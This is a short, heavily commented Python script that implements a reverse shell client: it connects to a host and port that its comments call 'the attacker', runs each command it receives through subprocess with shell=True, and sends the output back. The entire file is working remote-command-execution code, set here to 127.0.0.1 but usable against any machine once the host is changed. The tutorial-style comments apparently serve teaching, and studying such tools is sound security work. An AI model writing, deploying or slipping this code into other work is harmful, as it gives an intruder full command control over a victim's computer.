# This module provides access to the BSD socket interface. (https://realpython.com/python-sockets/)
# Sockets and the socket API are used to send messages across a network. 
import socket

# The subprocess module allows you to spawn new processes, connect to their 
# input/output/error pipes, and obtain their return codes.
import subprocess

# Setting the host and the port to which the client is supposed to connect
host = '127.0.0.1'
port = 6668

# Creating a IPv4 - TCP - Network Interface
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connecting to the attacker
client.connect((host, port))

while True:

    # Receiving the command and decoding it.
    command = client.recv(1024)
    command = command.decode()

    # Popen is used to execute the command and get the output.
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    # The output and the output_error are saved...
    output = op.stdout.read()
    output_error = op.stderr.read()

    # ...and then send to the attacker.
    client.send(output + output_error)